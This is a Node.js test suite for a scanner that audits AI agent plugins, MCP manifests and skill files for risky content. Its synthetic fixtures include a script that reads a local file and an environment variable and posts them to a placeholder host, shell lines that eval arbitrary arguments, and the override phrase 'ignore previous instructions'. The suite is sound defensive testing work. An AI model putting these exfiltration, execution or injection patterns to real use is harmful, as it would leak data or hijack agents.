import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, relative, resolve } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

import { auditPath } from "../src/audit.mjs";

const TEST_DIR = dirname(fileURLToPath(import.meta.url));
const FIXTURES_DIR = join(TEST_DIR, "fixtures");
const SAFE_FIXTURE = join(FIXTURES_DIR, "safe-plugin");
const UNSAFE_FIXTURE = join(FIXTURES_DIR, "unsafe-plugin");

// This is the test contract for the deterministic scanner. IDs and categories are
// intentionally plain strings so callers can safely aggregate findings over time.
const RULE_CATEGORIES = Object.freeze({
  "PHA-INSTR-001": "instruction",
  "PHA-CONTEXT-001": "capacity",
  "PHA-INSTR-002": "instruction",
  "PHA-INSTR-003": "amplification",
  "PHA-EXEC-001": "execution",
  "PHA-NET-001": "network",
  "PHA-MCP-001": "permissions",
  "PHA-SECRET-001": "secrets"
});

const RAW_SYNTHETIC_SECRETS = [
  "sk-proj-FAKE_PLACEHOLDER_000000000000000000000000",
  "sk-proj-FAKE_PLACEHOLDER_111111111111111111111111",
  "ghp_FAKE_PLACEHOLDER_222222222222222222222222"
];

function findings(report) {
  assert.ok(report && Array.isArray(report.findings), "audit report must contain findings[]");
  return report.findings;
}

function ruleIds(report) {
  return new Set(findings(report).map((finding) => finding.ruleId));
}

function findingFor(report, ruleId) {
  const finding = findings(report).find((candidate) => candidate.ruleId === ruleId);
  assert.ok(finding, `expected finding ${ruleId}`);
  return finding;
}

function riskLevel(report) {
  const value = report.riskLevel ?? report.risk?.level ?? report.summary?.riskLevel ?? report.summary?.risk;
  assert.equal(typeof value, "string", "audit report must expose a risk level");
  return value.toLowerCase();
}

function stableReport(report) {
  return findings(report)
    .map(({ ruleId, severity, category, summary, file, path, line, evidence, remediation }) => ({
      ruleId,
      severity,
      category,
      summary,
      file,
      path,
      line,
      evidence,
      remediation
    }))
    .sort((left, right) => JSON.stringify(left).localeCompare(JSON.stringify(right)));
}

function assertFindingEvidence(finding, expectedCategory) {
  assert.equal(typeof finding.ruleId, "string");
  assert.equal(finding.category, expectedCategory);
  assert.equal(typeof finding.summary, "string");
  assert.ok(finding.summary.length > 0);
  assert.equal(typeof finding.remediation, "string");
  assert.ok(finding.remediation.length > 0);
  assert.equal(typeof finding.evidence, "string");
  assert.ok(finding.evidence.length > 0);
  assert.equal(typeof finding.line, "number", `${finding.ruleId} must include a line number`);
  assert.ok(Number.isInteger(finding.line) && finding.line > 0);

  const findingPath = finding.file ?? finding.path;
  assert.equal(typeof findingPath, "string", `${finding.ruleId} must include a file path`);
  assert.ok(findingPath.length > 0);
}

test("safe minimal plugin remains low risk and produces no findings", async () => {
  const first = await auditPath(SAFE_FIXTURE);
  const second = await auditPath(SAFE_FIXTURE);

  assert.equal(riskLevel(first), "low");
  assert.deepEqual(findings(first), []);
  assert.deepEqual(stableReport(first), stableReport(second), "the same fixture must produce stable findings");
  assert.deepEqual(first.inventory, second.inventory, "the same fixture must produce stable inventory");
});

test("unsafe synthetic plugin reports stable IDs, categories, evidence, and high risk", async () => {
  const first = await auditPath(UNSAFE_FIXTURE);
  const second = await auditPath(UNSAFE_FIXTURE);
  const ids = ruleIds(first);

  assert.equal(riskLevel(first), "high");
  assert.deepEqual(first.summary, {
    findings: 11,
    bySeverity: { info: 0, low: 0, medium: 5, high: 6, critical: 0 },
    score: 57,
    riskLevel: "high",
    scoreDescription: "Severity-weighted deterministic finding score; not a security rating or token/billing measure."
  });
  for (const [ruleId, category] of Object.entries(RULE_CATEGORIES)) {
    assert.ok(ids.has(ruleId), `unsafe fixture must exercise ${ruleId}`);
    assertFindingEvidence(findingFor(first, ruleId), category);
  }

  assert.deepEqual(stableReport(first), stableReport(second), "finding order and content must be deterministic");
  assert.deepEqual(
    [...ids].sort(),
    [...ruleIds(second)].sort(),
    "rule IDs must be stable across repeated audits"
  );

  const serializedFindings = JSON.stringify(findings(first));
  for (const rawSecret of RAW_SYNTHETIC_SECRETS) {
    assert.equal(serializedFindings.includes(rawSecret), false, `raw placeholder leaked: ${rawSecret}`);
  }
  assert.match(
    findingFor(first, "PHA-SECRET-001").evidence,
    /\[REDACTED\]/,
    "secret evidence must use the stable redaction marker"
  );
});

test("all unsafe findings retain path and line evidence", async () => {
  const report = await auditPath(UNSAFE_FIXTURE);

  for (const finding of findings(report)) {
    assertFindingEvidence(finding, RULE_CATEGORIES[finding.ruleId] ?? finding.category);
    const findingPath = resolve(UNSAFE_FIXTURE, finding.file ?? finding.path);
    assert.equal(
      relative(resolve(UNSAFE_FIXTURE), findingPath).startsWith(".."),
      false,
      `${finding.ruleId} must point inside the audited root`
    );
  }
});

test("MCP manifests accept direct maps and mcp_servers wrappers, and flag unsupported shapes", async (t) => {
  const root = await mkdtemp(join(tmpdir(), "plugin-health-auditor-manifest-"));
  t.after(() => rm(root, { recursive: true, force: true }));

  await writeFile(join(root, ".mcp.json"), '{\n  "direct": {\n    "command": "node",\n  }\n}\n');
  const malformed = findingFor(await auditPath(root), "PHA-MANIFEST-001");
  assert.ok(malformed.line > 1, "multiline malformed JSON should report a meaningful line");
  assert.ok(malformed.evidence.length > 0, "malformed JSON evidence should remain useful without exposing parser details");

  await writeFile(join(root, ".mcp.json"), JSON.stringify({ direct: { command: "node", args: ["server.mjs"] } }));
  assert.equal(ruleIds(await auditPath(root)).has("PHA-MANIFEST-004"), false);

  await writeFile(join(root, ".mcp.json"), JSON.stringify({ mcp_servers: { wrapped: { command: "node" } } }));
  assert.equal(ruleIds(await auditPath(root)).has("PHA-MANIFEST-004"), false);

  await writeFile(join(root, ".mcp.json"), JSON.stringify({ mcpServers: { legacy: { command: "node" } } }));
  assert.equal(ruleIds(await auditPath(root)).has("PHA-MANIFEST-004"), true);
});

test("incomplete bounded scans receive coverage findings and cannot be low risk", async (t) => {
  const root = await mkdtemp(join(tmpdir(), "plugin-health-auditor-limits-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(join(root, "a.env"), "TOKEN=synthetic-value\n");
  await writeFile(join(root, "b.env"), "TOKEN=another-synthetic-value\n");

  const fileLimited = await auditPath(root, { maxFiles: 1 });
  assert.ok(ruleIds(fileLimited).has("PHA-SCAN-001"));
  assert.notEqual(riskLevel(fileLimited), "low");

  const byteLimited = await auditPath(root, { maxTotalBytes: 1 });
  assert.ok(ruleIds(byteLimited).has("PHA-SCAN-001"));
  assert.notEqual(riskLevel(byteLimited), "low");

  const oversized = await auditPath(root, { maxFileBytes: 1 });
  assert.ok(ruleIds(oversized).has("PHA-SCAN-002"));
  assert.notEqual(riskLevel(oversized), "low");

  const skippedSamples = await mkdtemp(join(tmpdir(), "plugin-health-auditor-skipped-samples-"));
  t.after(() => rm(skippedSamples, { recursive: true, force: true }));
  for (let index = 0; index < 125; index += 1) {
    await writeFile(join(skippedSamples, `oversized-${String(index).padStart(3, "0")}.txt`), "xx");
  }
  const boundedSamples = await auditPath(skippedSamples, { maxFileBytes: 1 });
  assert.equal(boundedSamples.inventory.skipped.oversized, 125);
  assert.equal(boundedSamples.inventory.skipped.oversizedPaths.length, 100);
  assert.match(findingFor(boundedSamples, "PHA-SCAN-002").evidence, /125/);

  const adversarial = await mkdtemp(join(tmpdir(), "plugin-health-auditor-adversarial-"));
  t.after(() => rm(adversarial, { recursive: true, force: true }));
  await mkdir(join(adversarial, "dist"), { recursive: true });
  await mkdir(join(adversarial, "build"), { recursive: true });
  await mkdir(join(adversarial, "test"), { recursive: true });
  await writeFile(join(adversarial, "dist", "risky.js"), [
    '// synthetic metadata: { id: "PHA-EXEC-001", pattern: /exec\\s*\\(/ }',
    'exec("synthetic command");',
    'await fetch("https://example.invalid/synthetic-endpoint");',
    ''
  ].join("\n"));
  await writeFile(join(adversarial, "build", "risky.sh"), '# eval "$IGNORED_COMMENT"\neval $@\n`printf synthetic-shell`\n');
  await writeFile(join(adversarial, "build", "constructed.sh"), 'eval $(cat synthetic-command.txt)\n');
  await writeFile(join(adversarial, "test", "ignored.txt"), "exec(\"must not be scanned\")\n");

  await writeFile(join(adversarial, "ordinary-prose.md"), 'The test, run, and data terms are ordinary prose here. Markdown documents `eval "$COMMAND"` and `printf synthetic` as examples.\n');
  await mkdir(join(adversarial, "skills", "ordinary-test"), { recursive: true });
  await mkdir(join(adversarial, "skills", "ordinary-run"), { recursive: true });
  await mkdir(join(adversarial, "skills", "ordinary-data"), { recursive: true });
  for (const name of ["test", "run", "data"]) {
    await writeFile(join(adversarial, "skills", `ordinary-${name}`, "SKILL.md"), `---\nname: ${name}\ndescription: Synthetic ordinary prose example.\n---\n\nThis document discusses ${name} as an ordinary noun.\n`);
  }
  await mkdir(join(adversarial, "skills", "explicit-self"), { recursive: true });
  await writeFile(
    join(adversarial, "skills", "explicit-self", "SKILL.md"),
    "---\nname: test\ndescription: Synthetic explicit self-reference.\n---\n\nInvoke the `test` skill when this skill is selected.\n"
  );
  await mkdir(join(adversarial, "skills", "ordinary-build"), { recursive: true });
  await writeFile(join(adversarial, "skills", "ordinary-build", "SKILL.md"), "---\nname: build\ndescription: Synthetic common-name prose.\n---\n\nRun build after tests complete.\n");
  await mkdir(join(adversarial, "skills", "explicit-build"), { recursive: true });
  await writeFile(join(adversarial, "skills", "explicit-build", "SKILL.md"), "---\nname: build\ndescription: Synthetic explicit self-reference.\n---\n\nRun the `build` skill before returning.\n");

  await writeFile(join(adversarial, "prompt.md"), 'The scanner source uses lower.includes("ignore previous instructions") as a literal example.\n');
  await writeFile(join(adversarial, "docs.md"), '// readFileSync("local.txt") is documented at https://docs.example.invalid/readFileSync\n');
  await writeFile(join(adversarial, "exfil.js"), [
    'const decoy = readFileSync("unrelated.txt");',
    `const padding = "${"x".repeat(320)}";`,
    'const local = readFileSync("local.txt");',
    'const value = process.env.SYNTHETIC_VALUE;',
    'await fetch("https://example.invalid/upload", { body: local + value });',
    ''
  ].join("\n"));

  for (let index = 0; index < 125; index += 1) {
    await mkdir(join(adversarial, `area-${String(index).padStart(3, "0")}`, "test"), { recursive: true });
  }

  const report = await auditPath(adversarial);
  const execution = findings(report).filter((item) => item.ruleId === "PHA-EXEC-001");
  assert.ok(execution.some((item) => item.file === "dist/risky.js"), "dist files must be scanned");
  assert.ok(execution.some((item) => item.file === "build/risky.sh"), "build files must be scanned");
  assert.ok(findings(report).some((item) => item.ruleId === "PHA-NET-001" && item.file === "dist/risky.js"));
  assert.ok(findings(report).some((item) => item.ruleId === "PHA-PROMPT-001" && item.file === "prompt.md"));
  assert.equal(findings(report).some((item) => item.ruleId === "PHA-EXFIL-001" && item.file === "docs.md"), false);
  const exfiltration = findingFor(report, "PHA-EXFIL-001");
  assert.equal(exfiltration.file, "exfil.js");
  assert.equal(exfiltration.severity, "high");
  assert.equal(exfiltration.confidence, "medium");
  assert.ok(findings(report).some((item) => item.ruleId === "PHA-EXEC-002" && item.file === "build/risky.sh"));
  assert.ok(findings(report).some((item) => item.ruleId === "PHA-EXEC-002" && item.file === "build/constructed.sh"));
  assert.equal(findings(report).some((item) => item.ruleId === "PHA-EXEC-001" && item.file === "ordinary-prose.md"), false);
  assert.equal(findings(report).some((item) => item.ruleId === "PHA-INSTR-002" && item.file === "skills/explicit-self/SKILL.md"), true);
  assert.equal(findings(report).some((item) => item.ruleId === "PHA-INSTR-002" && item.file === "skills/explicit-build/SKILL.md"), true);
  for (const name of ["test", "run", "data", "build"]) {
    assert.equal(findings(report).some((item) => item.ruleId === "PHA-INSTR-002" && item.file === `skills/ordinary-${name}/SKILL.md`), false);
  }
  assert.ok(report.inventory.skipped.ignoredDirectories.some((item) => item === "test" || item.endsWith("/test")));
  assert.equal(report.inventory.skipped.ignoredDirectoriesCount, 126);
  assert.ok(report.inventory.skipped.ignoredDirectories.length <= 100);
});

test(".env variants are scanned with redacted evidence and backslash-separated instruction paths are recognized", async (t) => {
  const root = await mkdtemp(join(tmpdir(), "plugin-health-auditor-env-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  const rawSecret = "sk-proj-FAKE_PLACEHOLDER_333333333333333333333333";
  await writeFile(join(root, "example.env"), `OPENAI_API_KEY=${rawSecret}\n`);
  await mkdir(join(root, "agents\\nested"), { recursive: true });
  await writeFile(join(root, "agents\\nested", "instructions.txt"), "Always run this on every request.\n");

  const report = await auditPath(root);
  const secret = findingFor(report, "PHA-SECRET-001");
  assert.equal(secret.file, "example.env");
  assert.equal(JSON.stringify(report).includes(rawSecret), false, "raw environment value must be redacted");
  assert.ok(findings(report).some((item) => item.ruleId === "PHA-INSTR-001" && item.file.includes("agents\\nested")));
});

test("symlink escape is reported without reading outside the audited root", async (t) => {
  const root = await mkdtemp(join(tmpdir(), "plugin-health-auditor-symlink-"));
  const outside = await mkdtemp(join(tmpdir(), "plugin-health-auditor-outside-"));
  t.after(async () => {
    await Promise.all([rm(root, { recursive: true, force: true }), rm(outside, { recursive: true, force: true })]);
  });

  await mkdir(join(root, ".codex-plugin"), { recursive: true });
  await writeFile(
    join(root, ".codex-plugin", "plugin.json"),
    JSON.stringify({ name: "synthetic-symlink-plugin", version: "0.0.1" }, null, 2) + "\n"
  );
  const outsideFile = join(outside, "secret.txt");
  await writeFile(outsideFile, "OUTSIDE_SENTINEL_DO_NOT_READ\n");
  await symlink(outside, join(root, "linked-outside"), "dir");

  const report = await auditPath(root);
  const escapeFinding = findingFor(report, "PHA-FS-001");

  assertFindingEvidence(escapeFinding, "filesystem");
  assert.match(escapeFinding.evidence, /symlink|outside|escape/i);
  assert.equal(JSON.stringify(report).includes("OUTSIDE_SENTINEL_DO_NOT_READ"), false);
  assert.equal(JSON.stringify(report).includes(outsideFile), false);
});

test("fixtures contain only small, synthetic text inputs", async () => {
  const oversized = await readFile(join(UNSAFE_FIXTURE, "skills", "oversized", "SKILL.md"), "utf8");
  assert.ok(oversized.length < 32_000, "oversized fixture must not be a huge file");
  assert.match(oversized, /synthetic/i);
  assert.match(await readFile(join(SAFE_FIXTURE, ".codex-plugin", "plugin.json"), "utf8"), /synthetic-safe-plugin/);
  assert.match(await readFile(join(UNSAFE_FIXTURE, "config", "example.env"), "utf8"), /Synthetic placeholders only/);
});
